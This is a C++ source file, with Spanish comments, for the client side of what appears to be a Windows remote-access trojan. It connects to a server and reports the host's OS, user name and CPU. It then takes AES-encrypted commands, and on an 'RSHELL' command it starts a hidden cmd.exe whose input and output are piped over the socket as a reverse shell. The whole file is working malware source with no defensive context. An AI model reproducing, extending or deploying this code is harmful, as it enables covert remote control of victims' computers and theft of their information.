#include "cliente.hpp"
#include "misc.hpp"

void Cliente::Init_Key() {
    for (unsigned char i = 0; i < AES_KEY_LEN; i++) {
        this->bKey.push_back(this->t_key[i]);
    }
}

Cliente::Cliente() {
    this->Init_Key();
}

Cliente::~Cliente() {
	this->CerrarConexion();
}

void Cliente::CerrarConexion() {
    if (this->sckSocket != INVALID_SOCKET) {
		closesocket(this->sckSocket);
		this->sckSocket = INVALID_SOCKET;
	}
}

bool Cliente::bConectar(const char* cIP, const char* cPuerto) {
	struct addrinfo sAddress, *sP, *sServer;
	memset(&sAddress, 0, sizeof(sAddress));

	sAddress.ai_family = AF_UNSPEC;
	sAddress.ai_socktype = SOCK_STREAM;

	int iRes = getaddrinfo(cIP, cPuerto, &sAddress, &sServer);
	if (iRes != 0) {
		error();
		return false;
	}

	for (sP = sServer; sP != nullptr; sP = sP->ai_next) {
		if ((this->sckSocket = socket(sP->ai_family, sP->ai_socktype, sP->ai_protocol)) == INVALID_SOCKET) {
			//socket error
			continue;
		}

		if (connect(this->sckSocket, sP->ai_addr, sP->ai_addrlen) == -1) {
			//No se pudo conectar
			error();
			continue;
		}
		//exito
		break;
	}

	if (sP == nullptr || this->sckSocket == INVALID_SOCKET) {
        freeaddrinfo(sServer);
        return false;
	}

    freeaddrinfo(sServer);
    
	return true;
}

void Cliente::MainLoop() {
    //Esperar por comandos
    char cBuffer[1024];
    memset(&cBuffer, 0, sizeof(cBuffer));
    while (this->isRunning) {
        //Limpiar el buffer
        if (cBuffer[0] != 0) {
            memset(&cBuffer, 0, sizeof(cBuffer));
        }

        //Espere el comando en modo block
#ifdef ___DEBUG_
        std::cout<<"Esperando comando\n";
#endif
        int iRecibido = this->cRecv(this->sckSocket, cBuffer, 1024, false);

        if (iRecibido <= 0 && GetLastError() != WSAEWOULDBLOCK) {
            //No se pudo recibir nada
            break;
        }
#ifdef ___DEBUG_
        std::cout << "[SERVIDOR] " << cBuffer << "\n";
#endif
        //Partir maximo 50 parametros
        this->ProcesarComando(strSplit(cBuffer, '~', 50));

    }
}

void Cliente::ProcesarComando(std::vector<std::string> strIn) {
    if (strIn.size() == 0) {
        //No hay comandos
        return;
    }
    int iEnviado = 0;
    if(strIn[0] == "PING"){
#ifdef ___DEBUG_
        std::cout << "Ping\n";
#endif
        //implementar un metodo para devolverle el pong con el numero de parametro
        iEnviado = this->cSend(this->sckSocket, "02\\P", 4, 0, false);
    }

    if (strIn[0] == "CUSTOM_TEST") {
        std::string strTest = "03\\";
        strTest += RandomID(7);
        iEnviado = this->cSend(this->sckSocket, strTest.c_str(), strTest.size(), 0, false);
    }

    if (strIn[0] == "RSHELL") {
        this->SpawnShell("C:\\Windows\\System32\\cmd.exe");
    }

#ifdef ___DEBUG_
    std::cout << "Enviados "<<iEnviado<<" bytes\n";
#endif
}


void Cliente::iniPacket() {
    //Enviar SO
    std::string strOut = "01\\";
    strOut += strOS();
    strOut.append(1, '\\');
    strOut += strUserName();
    strOut.append(1, '\\');
    strOut += strCpu();
    
    int iB = cSend(this->sckSocket, strOut.c_str(), strOut.length(), 0, false);
#ifdef ___DEBUG_
    std::cout << "Enviados " << iB << " bytes - "<< strOut <<"\n";
#endif
}

int Cliente::cSend(SOCKET& pSocket, const char* pBuffer, int pLen, int pFlags, bool isBlock) {
    
    // 1 non block
    // 0 block
    
    ByteArray cData = this->bEnc((const unsigned char*)pBuffer, pLen);
    std::string strPaqueteFinal = "";
    for (auto c : cData) {
        strPaqueteFinal.append(1, c);
    }
    
    if (isBlock) {
        //Hacer el socket block
        unsigned long int iBlock = 0;
        if (ioctlsocket(pSocket, FIONBIO, &iBlock) != 0) {
#ifdef ___DEBUG_
            error();
#endif
        }
        int iEnviado = send(pSocket, strPaqueteFinal.c_str(), cData.size(), pFlags);

        //Restaurar
        iBlock = 1;
        if (ioctlsocket(pSocket, FIONBIO, &iBlock) != 0) {
#ifdef ___DEBUG_
            error();
#endif
        }

        return iEnviado;
    }
    else {
        return send(pSocket, strPaqueteFinal.c_str(), cData.size(), pFlags);
    }
}

int Cliente::cRecv(SOCKET& pSocket, char* pBuffer, int pLen, int pFlags, bool isBlock) {
    //Aqui el socket por defecto es block asi que si se pasa false es normal
    // 1 non block
    // 0 block
    char* cTmpBuff = new char[pLen];
    ZeroMemory(cTmpBuff, pLen);

    int iRecibido = 0;
    if (isBlock) {
        //Hacer el socket block
        unsigned long int iBlock = 0;
        if (ioctlsocket(pSocket, FIONBIO, &iBlock) != 0) {
#ifdef ___DEBUG_
            error();
#endif
        }
        iRecibido = recv(pSocket, cTmpBuff, pLen, pFlags);
        std::cout << "Recibidos " << iRecibido << " bytes\n";
        if (iRecibido <= 0) {
            if (cTmpBuff) {
                ZeroMemory(cTmpBuff, pLen);
                delete[] cTmpBuff;
            }
            return -1;
        }
        //Decrypt

        ByteArray bOut = this->bDec((const unsigned char*)cTmpBuff, iRecibido);

        std::string strOut = "";
        iRecibido = 0;
        for (auto c : bOut) {
            strOut.append(1, c);
            iRecibido++;
        }
        memccpy(pBuffer, strOut.c_str(), '\0', 1024);

        //Restaurar
        iBlock = 1;
        if (ioctlsocket(pSocket, FIONBIO, &iBlock) != 0) {
#ifdef ___DEBUG_
            error();
#endif
        }
        if (cTmpBuff) {
            ZeroMemory(cTmpBuff, pLen);
            delete[] cTmpBuff;
        }
        return iRecibido;
    }
    else {

        iRecibido = recv(pSocket, cTmpBuff, pLen, pFlags);
        std::cout << "Recibidos " << iRecibido << " bytes\n";
        if (iRecibido <= 0) {
            if (cTmpBuff) {
                ZeroMemory(cTmpBuff, pLen);
                delete[] cTmpBuff;
            }
            return -1;
        }
        ByteArray bOut = this->bDec((const unsigned char*)cTmpBuff, iRecibido);

        std::string strOut = "";
        iRecibido = 0;
        for (auto c : bOut) {
            strOut.append(1, c);
            iRecibido++;
        }
        memccpy(pBuffer, strOut.c_str(), '\0', 1024);

        if (cTmpBuff) {
            ZeroMemory(cTmpBuff, pLen);
            delete[] cTmpBuff;
        }
        return iRecibido;
    }
}

//AES256
ByteArray Cliente::bEnc(const unsigned char* pInput, size_t pLen) {
    this->Init_Key();
    ByteArray bOutput;
    ByteArray::size_type enc_len = Aes256::encrypt(this->bKey, pInput, pLen, bOutput);
    if (enc_len <= 0) {
        std::cout << "Error encriptando " << pInput << "\n";
    }
    return bOutput;
}

ByteArray Cliente::bDec(const unsigned char* pInput, size_t pLen) {
    this->Init_Key();
    ByteArray bOutput;
    ByteArray::size_type dec_len = Aes256::decrypt(this->bKey, pInput, pLen, bOutput);
    if (dec_len <= 0) {
        std::cout << "Error desencriptando " << pInput << "\n";
    }
    return bOutput;
}

//Reverse shell
void Cliente::SpawnShell(const std::string pstrComando) {
#ifdef ___DEBUG_
    std::cout << "Lanzando " << pstrComando << "\n";
#endif
    PROCESS_INFORMATION pi;
    HANDLE stdinRd, stdinWr, stdoutRd, stdoutWr;
    stdinRd = stdinWr = stdoutRd = stdoutWr = nullptr;
    SECURITY_ATTRIBUTES sa;
    sa.nLength = sizeof(SECURITY_ATTRIBUTES);
    sa.lpSecurityDescriptor = nullptr;
    sa.bInheritHandle = true;
    if (!CreatePipe(&stdinRd, &stdinWr, &sa, 0) || !CreatePipe(&stdoutRd, &stdoutWr, &sa, 0)) {
#ifdef ___DEBUG_
        std::cout << "Error creando tuberias\n";
        error();
#endif
        return;
    }
    STARTUPINFO si;
    GetStartupInfo(&si);
    si.dwFlags = STARTF_USESTDHANDLES | STARTF_USESHOWWINDOW;
    si.wShowWindow = SW_HIDE;
    si.hStdOutput = stdoutWr;
    si.hStdError = stdoutWr;
    si.hStdInput = stdinRd;
    char cCmd[1024];
    ZeroMemory(cCmd, sizeof(cCmd));
    strncpy(cCmd, pstrComando.c_str(), 1024);
    if (CreateProcess(nullptr, cCmd, nullptr, nullptr, true, CREATE_NEW_CONSOLE, nullptr, nullptr, &si, &pi) == 0) {
#ifdef ___DEBUG_
        std::cout << "No se pudo spawnear la shell\n";
        error();
#endif
        return;
    }
    
    //La shell esta corriendo
    this->isShellRunning = true;
    this->cSend(this->sckSocket, "04\\Corriendo...", 16, 0, false);

    std::thread tRead(&Cliente::thLeerShell, this, stdoutRd);
    std::thread tWrite(&Cliente::thEscribirShell, this, stdinWr);
    tRead.join();
    tWrite.join();
    
    //La shell termino, enviar codigo a server
    this->cSend(this->sckSocket, "05\\Done, omar :v", 17, 0, false);

    TerminateProcess(pi.hProcess, 0);
    if (stdinRd != nullptr) {
        CloseHandle(stdinRd);
        stdinRd = nullptr;
    }
    if (stdinWr != nullptr) {
        CloseHandle(stdinWr);
        stdinWr = nullptr;
    }
    if (stdoutRd != nullptr) {
        CloseHandle(stdoutRd);
        stdoutRd = nullptr;
    }
    if (stdoutWr != nullptr) {
        CloseHandle(stdoutWr);
        stdoutWr = nullptr;
    }

    this->isShellRunning = false;
}

void Cliente::thLeerShell(HANDLE hPipe) {
    int iLen = 0, iRet = 0;
    char cBuffer[2046], cBuffer2[2046 * 2 + 30];
    DWORD dBytesReaded = 0, dBufferC = 0, dBytesToWrite = 0;
    BYTE bPChar = 0;
    while (this->isShellRunning) {
        if (PeekNamedPipe(hPipe, cBuffer, sizeof(cBuffer), &dBytesReaded, nullptr, nullptr)) {
            if (dBytesReaded > 0) {
                ReadFile(hPipe, cBuffer, sizeof(cBuffer), &dBytesReaded, nullptr);
            }
            else {
                Sleep(100);
                continue;
            }
            for (dBufferC = 0, dBytesToWrite = 0; dBufferC < dBytesReaded; dBufferC++) {
                if (cBuffer[dBufferC] == '\n' && bPChar != '\r') {
                    cBuffer2[dBytesToWrite++] = '\r';
                }
                bPChar = cBuffer2[dBytesToWrite++] = cBuffer[dBufferC];
            }
            cBuffer2[dBytesToWrite] = '\0';
            iLen = strlen(cBuffer2);

            //enviar buffer al server
            std::string strOut = "06\\";
            strOut += cBuffer2;
#ifdef ___DEBUG_
            std::cout << strOut << "\n";
#endif
            int isent = this->cSend(this->sckSocket, strOut.c_str(), strOut.size(), 0, false);
#ifdef ___DEBUG_
            std::cout << isent << "\n";
#endif

        }else {
#ifdef ___DEBUG_
            std::cout << "PeekNamedPipe error\n";
            error();
#endif
            std::unique_lock<std::mutex> lock(this->mtx_shell);
            this->isShellRunning = false;
            lock.unlock();
            break;
        }
    }
#ifdef ___DEBUG_
    std::cout << "Stop reading from shell\n";
    error();
#endif
}

void Cliente::thEscribirShell(HANDLE hPipe) {
    int iRet = 0;
    char cRecvBytes[4096], cBuffer[2048];
    DWORD dBytesWrited = 0, dBufferC = 0;
    while (this->isShellRunning) {
        int iRecibido = this->cRecv(this->sckSocket, cRecvBytes, sizeof(cRecvBytes), 0, false);

        std::string strIn = cRecvBytes;
        if (strIn == "exit\r\n") {
            std::unique_lock<std::mutex> lock(this->mtx_shell);
            this->isShellRunning = false;
            lock.unlock();
            break;
        }
        //if (cRecvBytes[0] == '\n' || cRecvBytes[0] == '\r' || dBufferC > 2047) {
            if (!WriteFile(hPipe, cRecvBytes, iRecibido, &dBytesWrited, nullptr)) {
#ifdef ___DEBUG_
                std::cout << "Error writing to pipe\n";
                error();
#endif
                std::unique_lock<std::mutex> lock(this->mtx_shell);
                this->isShellRunning = false;
                lock.unlock();
                break;
            }
#ifdef ___DEBUG_
            std::cout << "Writed " << dBytesWrited << " bytes\n";
#endif
            //dBufferC = 0;
        //}
    }
#ifdef ___DEBUG_
    std::cout << "Stop writing to shell\n";
    error();
#endif
}